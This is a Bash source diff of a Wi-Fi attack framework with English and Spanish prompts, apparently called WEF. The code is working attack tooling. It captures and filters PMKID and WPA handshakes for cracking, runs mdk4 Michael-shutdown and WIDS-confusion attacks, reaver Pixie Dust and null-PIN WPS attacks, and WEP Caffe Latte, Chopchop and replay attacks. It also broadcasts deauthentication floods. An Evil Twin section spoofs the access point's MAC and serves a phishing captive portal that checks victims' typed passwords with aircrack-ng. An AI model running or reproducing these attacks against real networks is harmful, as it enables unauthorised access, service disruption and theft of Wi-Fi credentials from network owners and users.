+  kill -9 ${hcx_PID} 2>/dev/null; wait ${hcx_PID} 2>/dev/null
 
-  progress_bar 2 0.3 "*" "Obtaining hashes"
+  sleep 0.2
 
-  rm "/opt/wef/main/captures/${name}/pmkid_capture" 2>/dev/null
-  cp "${dir}/pmkid_capture" "/opt/wef/main/captures/${name}/" 2>/dev/null
-
-  hcxpcapngtool -o pmkid_hash "${dir}/pmkid_capture" &>/dev/null; sleep 0.1
-  cat pmkid_hash 2>/dev/null | grep -i "${pmkid_bssid}" | sponge pmkid_hash
-
-  rm "${dir}/pmkid_capture" 2>/dev/null
-  mv "${dir}/pmkid_hash" "/opt/wef/main/captures/${name}/" 2>/dev/null
-
-  good_output_ln "+" "PMKID Attack completed"
-  sleep 0.3; report-gen
-
-  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 0.1
-  color_output_ln "*" "Hashes stored in: /opt/wef/main/captures/${name}/"; sleep 0.1
-  echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack the handshake? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
-  
-  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ]; then
-    pmkid_crack
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.3 "*" "Obtaining hashes (/opt/wef/main/captures/${name}/pmkid_capture)"
   else
-    reset_info; keep_exit
+    progress_bar 2 0.3 "*" "Obteniendo hashes (/opt/wef/main/captures/${name}/pmkid_capture)"
+  fi
+  sleep 0.2 # Let the user read
+
+  if [[ $verbose == 0 ]]; then
+    hcxpcapngtool -o "/opt/wef/main/captures/${name}/mixed_hashes" "/opt/wef/main/captures/${name}/pmkid_capture" &>/dev/null
+  elif [[ $verbose == 1 ]]; then
+    echo
+    hcxpcapngtool -o "/opt/wef/main/captures/${name}/mixed_hashes" "/opt/wef/main/captures/${name}/pmkid_capture"
+  fi
+
+  if [ -f "/opt/wef/main/captures/${name}/mixed_hashes" ]; then
+    if [ "$lang" == "en" ]; then
+      progress_bar 2 0.2 "*" "Filtering hashes of target AP"
+    else
+      progress_bar 2 0.2 "*" "Filtrando hashes del AP objetivo"
+    fi
+
+    if [[ $verbose == 0 ]]; then
+      hcxhashtool -o "/opt/wef/main/captures/${name}/pmkid_hashes" --type=1 --mac-ap=${ap_mac} -i "/opt/wef/main/captures/${name}/mixed_hashes" &>/dev/null
+    elif [[ $verbose == 1 ]]; then
+      hcxhashtool -o "/opt/wef/main/captures/${name}/pmkid_hashes" --type=1 --mac-ap=${ap_mac} -i "/opt/wef/main/captures/${name}/mixed_hashes" | head -c -1
+    fi
+  fi
+
+  # Re-enable monitor mode (with airmon-ng)
+  ifconfig ${oldCard} down
+  iwconfig ${oldCard} mode managed
+  ifconfig ${oldCard} up
+  airmon-ng start ${oldCard} &>/dev/null
+
+  report-gen
+  log_completed
+
+  if [ -f "/opt/wef/main/captures/${name}/pmkid_hashes" ]; then
+    if [ "$lang" == "en" ]; then
+      handshake_total=$(wc -l "/opt/wef/main/captures/${name}/pmkid_hashes" | awk '{print $1}')
+      color_output "*" "${handshake_total} handshakes written to /opt/wef/main/captures/${name}/pmkid_hashes"
+      color_output_no_line "*" "Do you want to crack the PMKID handshakes? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
+    else
+      handshake_total=$(wc -l "/opt/wef/main/captures/${name}/pmkid_hashes" | awk '{print $1}')
+      color_output "*" "${handshake_total} handshakes almacenados en /opt/wef/main/captures/${name}/pmkid_hashes"
+      color_output_no_line "*" "Quieres crackear los handshakes PMKID? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
+    fi
+
+  else
+    if [ "$lang" == "en" ]; then
+      color_output "*" "No PMKID handshakes captured"
+    else
+      color_output "*" "No se han capturado handshakes PMKID"
+    fi
+  fi
+  
+  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
+    pmkid_crack
+  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
+    ctrl_c
+  else
+    reset_info
+    keep_exit
   fi
 }
 
-# Passive Attack Function
-function passive_attack(){
-  clear; banner2; sleep 0.3
-
+# Passive WPA Capture attack
+function passive_capture_attack(){
+  clear
   check_ap_list # Show APs info or scan APs if it hasn't been done
-  echo; ask_data2; default="5m"; ask_time
+  log_back_to_menu
 
-  if [ ! "${attack_time}" ]; then
-    attack_time="5m"
+  ask_essid
+  if [ "$name" == "back" ]; then
+    return
+  fi
+  parse_info
+
+  default="5m"
+  ask_time
+  if [ "$attack_time" == "back" ]; then
+    return
   fi
 
-  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
-  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
+  clear
+  log_attack_info
+  press_enter_attack
+  echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting passive WPA handshake capture attack, press Ctrl + C if you want to stop it"
+  else
+    progress_bar 2 0.2 "*" "Comenzando ataque pasivo de captura de handshake WPA, presiona Ctrl + C si quieres pararlo"
+  fi
 
-  progress_bar 2 0.2 "*" "Starting Passive/Stealthy attack"
-  xterm -hold -e "airodump-ng -c ${channel} -w ${dir}/Capture --essid \"${name}\" ${netCard}" 2>/dev/null & # Escape double quotes so they are executed by xterm and avoid errors
-  passive2_PID=$!
-
-  sleep "${attack_time}"
-
-  kill -9 ${passive2_PID}; wait ${passive2_PID} 2>/dev/null # Kill background process
-
-  good_output_ln "+" "Passive attack completed"; sleep 0.1
   check_and_create "/opt/wef/main/captures/${name}"
-  mv Capture-* "/opt/wef/main/captures/${name}/" 2>/dev/null
+  cap_date=$(date +"%Y-%m-%d-%H-%M-%S")
+  cap_name="${cap_date}-capture"
+
+  xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Airodump-ng" -e "airodump-ng -c ${channel} -w \"/opt/wef/main/captures/${name}/${cap_name}\" --essid \"${name}\" ${netCard}" 2>/dev/null & # Escape double quotes to avoid errors
+  passive_PID=$!
+
+  sleep "${attack_time}" # Sleep for the asked time
+  kill -9 ${passive_PID} 2>/dev/null; wait ${passive_PID} 2>/dev/null # Kill background process
+
   report-gen
+  log_completed
+  if [ "$lang" == "en" ]; then
+    color_output "*" "Capture saved in /opt/wef/main/captures/${name}/${cap_name}-01.cap"
+  else
+    color_output "*" "Captura guardadas en /opt/wef/main/captures/${name}/${cap_name}-01.cap"
+  fi
 
-  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 0.3
-  color_output_ln "*" "Captures stored in: /opt/wef/main/captures/${name}/"; sleep 0.5
-  echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack the handshake(s)? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
+  c_h="true"
+  check_captured_handshakes
+  if [ "$(check_handshake)" -gt "0" ]; then
+    ask_to_crack_handshakes
+  fi
 
-  if [ "${crack_option}" == "y" ] || [ "${crack_option}" == "yes" ]; then
+  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
     handshake_crack
   else
-    reset_info; keep_exit
+    reset_info
+    keep_exit
   fi
 }
 
-# Michael Exploitation Attack
-function michael(){
-  clear; banner3; sleep 0.3
-
+# Michael Shutdown Exploitation Attack
+function michael_attack(){
+  clear
   check_ap_list # Show APs info or scan APs if it hasn't been done
-  echo; ask_data2; default="120s"; ask_time
+  log_back_to_menu
 
-  if [ ! "${attack_time}" ]; then
-    attack_time="120"
+  ask_essid
+  if [ "$name" == "back" ]; then
+    return
+  fi
+  
+  default="120s"
+  ask_time
+  if [ "$attack_time" == "back" ]; then
+    return
+  fi
+  parse_info
+
+  clear
+  log_attack_info
+  press_enter_attack
+  echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting Michael Exploitation attack, press Ctrl + C if you want to stop it"
+  else
+    progress_bar 2 0.2 "*" "Comenzando ataque Michael Exploitation, presiona Ctrl + C si quieres pararlo"
   fi
 
-  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
-  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
-  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
-
-  check_and_create "/opt/wef/main/captures/${name}"
-
-  progress_bar 2 0.2 "*" "Starting Michael Exploitation attack"
-
-  if [ "$verbose" == "0" ]; then
-    timeout "${attack_time}" bash -c "mdk4 ${netCard} m -t ${ap_mac} -j &>/dev/null"
-  elif [ "$verbose" == "1" ]; then
+  if [[ $verbose == 0 ]]; then
+    mdk4 ${netCard} m -t ${ap_mac} -j &>/dev/null &
+    mdk4_PID=$!
+    sleep "${attack_time}"
+    kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
+  elif [[ $verbose == 1 ]]; then
     echo
-    timeout "${attack_time}" bash -c "mdk4 ${netCard} m -t ${ap_mac} -j"
+    mdk4 ${netCard} m -t ${ap_mac} -j &
+    mdk4_PID=$!
+    sleep "${attack_time}"
+    kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
+    echo
   fi
 
   report-gen
-  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 0.3
+  log_completed
   reset_info
-  good_output_ln "+" "Attack completed"; sleep 0.5; reset_info
-  
+  keep_exit
+}
+
+# WIDS Confusion attack (MDK4)
+function wids_confusion(){
+  clear
+  check_ap_list
+  log_back_to_menu
+
+  ask_essid
+  if [ "$name" == "back" ]; then
+    return
+  fi
+  parse_info
+
+  default="120s"
+  ask_time
+  if [ "$attack_time" == "back" ]; then
+    return
+  fi
+
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "Do you want to activate the Zero_Chaos' WIDS exploit? (default=no) [${yC}y${blueC}/${yC}n${blueC}]: " && read zero_chaos
+  else
+    color_output_no_line "*" "Quieres activar el exploit de WIDS Zero_Chaos? (por defecto=no) [${yC}s${blueC}/${yC}n${blueC}]: " && read zero_chaos
+  fi
+
+  if [ "$zero_chaos" == "y" ] || [ "$zero_chaos" == "yes" ] || [ "$zero_chaos" == "s" ] || [ "$zero_chaos" == "si" ]; then
+    zero_chaos="true"
+  elif [ "$zero_chaos" == "back" ]; then
+    return
+  fi
+
+  clear
+  log_attack_info
+  press_enter_attack
+  echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting WIDS Confusion attack, press Ctrl + C if you want to stop it"
+  else
+    progress_bar 2 0.2 "*" "Comenzando ataque de Confusión WIDS, presiona Ctrl + C si quieres pararlo"
+  fi
+
+  if [ "$zero_chaos" != "true" ] && [[ $verbose == 0 ]]; then
+    mdk4 ${netCard} w -e "${name}" -c ${channel} &>/dev/null &
+  elif [ "$zero_chaos" == "true" ] && [[ $verbose == 0 ]]; then
+    mdk4 ${netCard} w -e "${name}" -c ${channel} -z &>/dev/null &
+  elif [ "$zero_chaos" != "true" ] && [[ $verbose == 1 ]]; then
+    mdk4 ${netCard} w -e "${name}" -c ${channel} &
+  elif [ "$zero_chaos" == "true" ] && [[ $verbose == 1 ]]; then
+    mdk4 ${netCard} w -e "${name}" -c ${channel} -z &
+  fi
+
+  mdk4_PID=$!
+  sleep "${attack_time}"
+  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
+
+  report-gen
+  log_completed
+  reset_info
   keep_exit
 }
 
 # WPS Pixie Dust Attack
 function pixie_dust(){
-  clear; banner1; sleep 0.3
-
+  clear
   check_ap_list # Show APs info or scan APs if it hasn't been done
-  echo; ask_data2; sleep 0.3
+  log_back_to_menu
 
-  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
-  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
-  progress_bar 2 0.2 "*" "Starting Pixie Dust attack"
+  ask_essid
+  if [ "${name}" == "back" ]; then
+    return
+  fi
+  parse_info
 
-  if [ "$verbose" == "0" ]; then
-    reaver -i "${netCard}" -b "${ap_mac}" -c "${channel}" -K 1 -v -g 3
-  elif [ "$verbose" == "1" ]; then
-    reaver -i "${netCard}" -b "${ap_mac}" -c "${channel}" -K 1 -vv -g 3
-  fi; sleep 0.3
+  default="60s"
+  ask_time
+  if [ "${attack_time}" == "back" ]; then
+    return
+  fi
 
-  check_and_create "/opt/wef/main/captures/${name}/"
+  clear
+  log_attack_info
+  press_enter_attack
+  echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting Pixie Dust attack, press Ctrl + C if you want to stop it"
+  else
+    progress_bar 2 0.2 "*" "Comenzando ataque Pixie Dust, presiona Ctrl + C si quieres pararlo"
+  fi
+
+  if [ $verbose == 0 ]; then
+    reaver -i "${netCard}" -b "${ap_mac}" -c "${channel}" -K 1 -v -g 3 &
+    reaver_PID=$!
+  elif [ $verbose == 1 ]; then
+    reaver -i "${netCard}" -b "${ap_mac}" -c "${channel}" -K 1 -vv -g 3 &
+    reaver_PID=$!
+  fi
+  sleep "${attack_time}"
+  kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null
+
   report-gen
-  good_output_ln "+" "Pixie Dust Attack completed"; sleep 0.1
-  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 1
+  log_completed
   reset_info
-	
   keep_exit
 }
 
 # Null Pin Attack
-function null-pin(){
-  clear; banner3; sleep 0.3
-
+function null_pin(){
+  clear
   check_ap_list # Show APs info or scan APs if it hasn't been done
-  echo; ask_data2
+  log_back_to_menu
 
-  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
-  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
-  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
+  ask_essid
+  if [ "$name" == "back" ]; then
+    return
+  fi
+  parse_info
 
-  progress_bar 2 0.2 "*" "Starting Null Pin attack..."
+  default="40s"
+  ask_time
+  if [ "$attack_time" == "back" ]; then
+    return
+  fi
+
+  clear
+  log_attack_info
+  press_enter_attack
   echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting Null Pin attack, press Ctrl + C if you want to stop it"
+  else
+    progress_bar 2 0.2 "*" "Comenzando ataque de Pin nulo"
+  fi
 
-  timeout 60 bash -c "reaver -i ${netCard} -b ${ap_mac} -c ${channel} -f -N -g 2 -vv -p ''"; sleep 0.2
+  # Perform attack
+  reaver -i "${netCard}" -b "${ap_mac}" -c "${channel}" -f -N -g 2 -vv -p '' &
+  reaver_PID=$!
+  sleep "${attack_time}"
+  kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null
 	
-  check_and_create "/opt/wef/main/captures/${name}"
-
-  good_output_ln "+" "Null Pin Attack completed"; sleep 0.1
   report-gen
-  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 1
+  log_completed
   reset_info
-  
   keep_exit
 }
 
-# Caffe-Latte Attack
-function caffe-latte(){
-  clear; banner1; sleep 0.3
-
+# Caffe Latte Attack
+function caffe_latte(){
+  clear
   check_ap_list # Show APs info or scan APs if it hasn't been done
-  echo; ask_data2; default="180s"; ask_time
-
-  if [ ! "${attack_time}" ]; then
-    attack_time="180"
+  log_back_to_menu
+  
+  ask_essid
+  if [ "$name" == "back" ]; then
+    return
+  fi
+  parse_info
+  
+  default="180s"
+  ask_time
+  if [ "$attack_time" == "back" ]; then
+    return
   fi
 
-  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
-  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
+  clear
+  log_attack_info
+  press_enter_attack
+  echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting CaffeLatte attack, press Ctrl + C if you want to stop it"
+  else
+    progress_bar 2 0.2 "*" "Comenzando ataque CaffeLatte, presiona Ctrl + C si quieres pararlo"
+  fi
 
-  progress_bar 2 0.2 "*" "Starting Caffe-Latte attack"
-  xterm -hold -e "airodump-ng -c ${channel} -w CaffeLatte ${netCard}" 2>/dev/null &
+  check_and_create "/opt/wef/main/captures/${name}"
+  xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Airodump-ng" -e "airodump-ng -c ${channel} -w /opt/wef/main/captures/${name}/CaffeLatte ${netCard}" 2>/dev/null &
   air_PID=$!
 
   timeout ${attack_time} bash -c "airbase-ng -c ${channel} --essid \"${name}\" ${netCard} -L -x 100"
   sleep 0.2
-  kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null
+  kill -9 ${air_PID} 2>/dev/null; wait ${air_PID} 2>/dev/null
 
-  check_and_create "/opt/wef/main/captures/${name}"
-  mv CaffeLatte "/opt/wef/main/captures/${name}" 2>/dev/null
   report-gen
+  log_completed
 
-  good_output_ln "+" "Caffe-Latte Attack completed"; sleep 0.1
-  color_output_ln "*" "Captures stored in: /opt/wef/main/captures/${name}/"; sleep 0.1
-  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 1
+  if [ "$lang" == "en" ]; then
+    color_output_ln "*" "Capture saved in /opt/wef/main/captures/${name}/${cap_name}-01.cap"
+  else
+    color_output_ln "*" "Captura guardada en /opt/wef/main/captures/${name}/${cap_name}-01.cap"
+  fi
+
   reset_info
-	
   keep_exit
 }
 
 # Chopchop Attack
 function chopchop(){
-  clear; banner3; sleep 0.3
-
+  clear
   check_ap_list # Show APs info or scan APs if it hasn't been done
-  sleep 0.1; echo; ask_data2; sleep 0.2
+  log_back_to_menu
 
-  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
-  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
-  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
+  ask_essid
+  if [ "$name" == "back" ]; then
+    return
+  fi
+  parse_info
 
-  color_output_ln "*" "Starting Chopchop attack...\n"
+  clear
+  log_attack_info
+  press_enter_attack
+  echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting Chopchop attack, press Ctrl + C if you want to stop it"
+  else
+    progress_bar 2 0.2 "*" "Comenzando ataque Chopchop, presiona Ctrl + C si quieres pararlo"
+  fi
   
-  aireplay-ng -1 0 -e "${name}" -a ${client_mac} -h ${ap_mac} ${netCard}
-  sleep 0.3; echo
-  aireplay-ng -4 -h ${client_mac} -b ${ap_mac} ${netCard}
-  sleep 0.3
+  echo
+  aireplay-ng -4 -d ${ap_mac} -e "${name}" ${netCard}
 
-  check_and_create "/opt/wef/main/captures/${name}"
   report-gen
-  mv Capture* "/opt/wef/main/captures/${name}/" 2>/dev/null
-
-  color_output_ln "+" "Attack completed"; sleep 0.1
-  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 1
+  log_completed
   reset_info
-
   keep_exit
 }
 
 # Replay Attack
 function replay(){
-  clear; banner1; sleep 0.3
-
+  clear
   check_ap_list # Show APs info or scan APs if it hasn't been done
-  echo; sleep 0.1; ask_data2; default="180s"; ask_time; sleep 0.2
-	
-  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
-  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
-  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
+  log_back_to_menu
 
-  if [ ! "${attack_time}" ]; then
-    attack_time="180"
+  ask_essid
+  if [ "$name" == "back" ]; then
+    return
+  fi
+  parse_info
+
+  default="180s"
+  ask_time
+  if [ "$attack_time" == "back" ]; then
+    return
   fi
 
-  color_output_ln "*" "Speed of the attack:"; sleep 0.1
-  color_output "1" "Fast"; sleep 0.1
-  color_output "2" "Normal\n"; sleep 0.1
-  color_output_no_line "WEF" "Select an option [default: normal]: " && read speed_option
+  if [ "$lang" == "en" ]; then
+    echo -e "\n${blueC}Speed of the attack:${endC}"
+    color_output "1" "Fast"
+    color_output "2" "Normal\n"
+    color_output_no_line "*" "Select an option (default=normal): " && read speed_option
+  else
+    echo -e "\n${blueC}Velocidad del ataque:${endC}"
+    color_output "1" "Rapido"
+    color_output "2" "Normal\n"
+    color_output_no_line "*" "Selecciona una opción (por defecto=normal): " && read speed_option
+  fi
 
   if [ "$speed_option" == "1" ]; then
-    sleep 0.1
-    color_output_ln "*" "Increasing the amount of IV's..."
-    timeout 120 bash -c "aireplay-ng -1 0 -e ${name} -a ${ap_mac} ${netCard} &>/dev/null"
-  fi; sleep 0.1
+    if [ "$lang" == "en" ]; then
+      color_output_ln "*" "Increasing the amount of IVs..."
+    else
+      color_output_ln "*" "Incrementando la cantidad de IVs..."
+    fi
+    timeout 120 bash -c "aireplay-ng -1 0 -e ${name} -d ${ap_mac} ${netCard} &>/dev/null"
+  fi; sleep 0.2
 
-  color_output_ln "*" "Starting replay attack..."; sleep 1
-
-  xterm -hold -e "airodump-ng -c ${channel} -w ${dir}/Capture --essid \"${name}\" ${netCard}" 2>/dev/null
-  air2_PID=$!
-  sleep 0.3
-
-  timeout ${attack_time} bash -c "aireplay-ng -3 -b ${ap_mac} ${netCard} 2>/dev/null"
-
-  sleep 1; kill -9 ${air2_PID}; wait ${air2_PID} 2>/dev/null
+  clear
+  log_attack_info
+  press_enter_attack
+  echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting Replay attack, press Ctrl + C if you want to stop it"
+  else
+    progress_bar 2 0.2 "*" "Comenzando ataque de Replay, presiona Ctrl + C si quieres pararlo"
+  fi
 
   check_and_create "/opt/wef/main/captures/${name}"
+  cap_date=$(date +"%Y-%m-%d-%H-%M-%S")
+  cap_name="${cap_date}-capture"
+  xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Airodump-ng" -e "airodump-ng -c ${channel} -w \"/opt/wef/main/captures/${name}/${cap_name}\" --essid \"${name}\" ${netCard}" 2>/dev/null &
+  air_PID=$!
+
+  aireplay-ng -3 -b ${ap_mac} ${netCard} 2>/dev/null &
+  replay_PID=$!
+
+  sleep "${attack_time}"
+  kill -9 ${replay_PID} 2>/dev/null; wait ${replay_PID} 2>/dev/null
+  sleep 2
+  kill -9 ${air_PID} 2>/dev/null; wait ${air_PID} 2>/dev/null
+
   report-gen
-  mv Capture* "/opt/wef/main/captures/${name}/" 2>/dev/null; sleep 0.3
-
-  good_output_ln "+" "Attack completed"; sleep 1
-  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 0.3
+  log_completed
   reset_info
-
   keep_exit
 }
 
-# Command Execution Mode
-function exec_commands(){
-  color_output_ln "*" "Entering command mode\n"; sleep 0.3
-  #tput cnorm
-  while true; do
-    echo -ne "${yC}#${blueC} $(whoami) >${endC} " && read your_command
+# Inhibitor Function
+function inhibitor(){
+  trap inhibition_c INT # Change Ctrl + C keyboard interrupt function
 
-    command_to_check=$(echo -e "${your_command}" | awk '{print $1}' FS=" ")
-    if [ "${your_command}" != "exit" ]; then
-      which ${command_to_check} &>/dev/null
-      if [ "$(echo $?)" == "0" ] || [ "${command_to_check}" == "cd" ]; then
-        echo
-        ${your_command}
-        echo
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Getting AP channel"
+  else
+    progress_bar 2 0.2 "*" "Obteniendo el canal del AP"
+  fi
+
+  if [ ! -f "/tmp/.scan_output" ]; then
+    check_ap_list
+    parse_info
+  else
+    parse_info
+  fi
+
+  iwconfig ${netCard} channel ${channel} # Change interface channel
+  if [ "$lang" == "en" ]; then
+    progress_bar 2 0.2 "*" "Starting inhibition"
+    color_output_ln "*" "Press Ctrl + C to stop the attack"
+  else
+    progress_bar 2 0.2 "*" "Comenzando inhibición" 
+    color_output_ln "*" "Presiona Ctrl + C para parar el ataque"
+  fi
+
+  if [[ $verbose == 0 ]]; then
+    aireplay-ng -0 0 -e "${name}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null
+  elif [[ $verbose == 1 ]]; then
+    echo
+    aireplay-ng -0 0 -e "${name}" -c FF:FF:FF:FF:FF:FF ${netCard}
+    echo
+  fi
+
+  if [ "$lang" == "en" ]; then
+    good_output_ln "+" "Inhibition completed"
+  else
+    good_output_ln "+" "Inhibición completada"
+  fi
+}
+
+
+
+
+#
+# Evil Twin attack functions
+#
+
+function setup_interface_eviltwin(){
+  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
+    if hash rfkill 2> /dev/null; then
+      rfkill unblock all > /dev/null 2>&1
+    fi
+
+    ip link set "${evilCard}" down
+    iw "${evilCard}" set monitor control
+    # Check MAC spoofing
+    if [ "$mac_spoof" == "y" ] || [ "$mac_spoof" == "yes" ] || [ "$mac_spoof" == "s" ] || [ "$mac_spoof" == "si" ]; then
+      macchanger -m "${ap_mac}" ${evilCard} &>/dev/null
+    fi
+    ip link set "${evilCard}" up
+
+    rand_mac=$(generate_rand_mac)
+    iw "${evilCard}" interface add "mon${evilCard}" type monitor addr ${rand_mac}; sleep 0.3
+
+  else
+    ifconfig "${evilCard}" down
+    iwconfig "${evilCard}" mode monitor
+    # Check MAC spoofing
+    if [ "$mac_spoof" == "y" ] || [ "$mac_spoof" == "yes" ] || [ "$mac_spoof" == "s" ] || [ "$mac_spoof" == "si" ]; then
+      macchanger -m "${ap_mac}" ${evilCard} &>/dev/null
+    fi
+    ifconfig "${evilCard}" up
+  fi
+}
+
+function restore_interface_eviltwin(){
+  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
+    iw "mon${evilCard}" del 2>/dev/null; sleep 0.2
+  fi
+
+  ifconfig "${evilCard}" down 2>/dev/null; sleep 0.1
+  iwconfig "${evilCard}" mode managed 2>/dev/null; sleep 0.1
+  ifconfig "${evilCard}" up 2>/dev/null; sleep 0.2
+}
+
+function create_lighttpd_conf(){
+  { 
+  echo -e "server.document-root = \"${portal_path}\"\n"
+	echo -e "server.modules = ("
+	echo -e "\"mod_auth\","
+	echo -e "\"mod_cgi\","
+	echo -e "\"mod_redirect\""
+	echo -e ")\n"
+	echo -e "\$HTTP[\"host\"] =~ \"(.*)\" {"
+	echo -e "url.redirect = ( \"^/index.htm$\" => \"/\")"
+	echo -e "url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"gstatic.com\" {"
+	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.google.com/\")"
+	echo -e "url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"captive.apple.com\" {"
+	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.apple.com/\")"
+	echo -e "url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"msftconnecttest.com\" {"
+	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
+	echo -e "url.redirect-code = 302"
+	echo -e "}"
+	echo -e "\$HTTP[\"host\"] =~ \"msftncsi.com\" {"
+	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
+	echo -e "url.redirect-code = 302"
+	echo -e "}"
+	echo -e "server.port = 80\n"
+	echo -e "index-file.names = ( \"index.htm\" )\n"
+	echo -e "server.error-handler-404 = \"/\"\n"
+	echo -e "mimetype.assign = ("
+	echo -e "\".css\" => \"text/css\","
+	echo -e "\".js\" => \"text/javascript\""
+	echo -e ")\n"
+	echo -e "cgi.assign = ( \".htm\" => \"/bin/bash\" )"
+	} >> "/opt/wef/cache/lighttpd.conf"
+}
+
+# Use 'sed' with regex to edit template
+function create_template(){
+  sed -i "s/<span class=\"bold\">.*<\/span>/<span class=\"bold\">${name}<\/span>/" /opt/wef/main/captive-portals/${country_code}-portal/index.htm
+  handshake_path=$(echo "${handshake_cap}" | sed 's/\//\\\//g')
+  sed -i "26s/.*/aircrack-ng -a 2 -b ${ap_mac} -w \"\/tmp\/www\/ag.et_currentpass.txt\" \"${handshake_path}\" | grep \"KEY FOUND!\" > \/dev\/null/" /opt/wef/main/captive-portals/${country_code}-portal/check.htm
+}
+
+function check_eviltwin_password(){
+  while true; do
+    if [ -f "/tmp/www/ag.et_success.txt" ] && [ "$(cat /tmp/www/ag.et_currentpass.txt)" ]; then
+      if [ "$lang" == "en" ]; then
+        echo -e "\n\n${blueC}[${greenC}+${blueC}] Correct password obtained: ${yC}$(cat /tmp/www/ag.et_currentpass.txt)${endC}"
+        good_output "+" "Password stored in /opt/wef/main/captures/${name}/eviltwin_password.txt"
       else
-        echo -e "Unknown command"
+        echo -e "\n\n${blueC}[${greenC}+${blueC}] Contraseña correcta obtenida: ${yC}$(cat /tmp/www/ag.et_currentpass.txt)${endC}"
+        good_output "+" "Contraseña almacenada en /opt/wef/main/captures/${name}/eviltwin_password.txt"
       fi
-    else
-      # tput civis
-      sleep 0.3
-      color_output_ln "*" "Entering normal mode"; sleep 0.5
+      cp "/tmp/www/ag.et_currentpass.txt" "/opt/wef/main/captures/${name}/eviltwin_password.txt" 2>/dev/null
+      rm -rf "/tmp/www" 2>/dev/null
+
+      sleep 4
+      killall xterm hostapd dnsmasq lighttpd 2>/dev/null
       break
     fi
   done
+  
+  if [ "$lang" == "en" ]; then
+    press_enter "Attack finished, press Enter to return to menu "
+  else
+    press_enter "El ataque ha terminado, presiona Enter para volver al menu "
+  fi
 }
 
-# Evil Twin Attack
+function check_eviltwin_success(){
+  while true; do
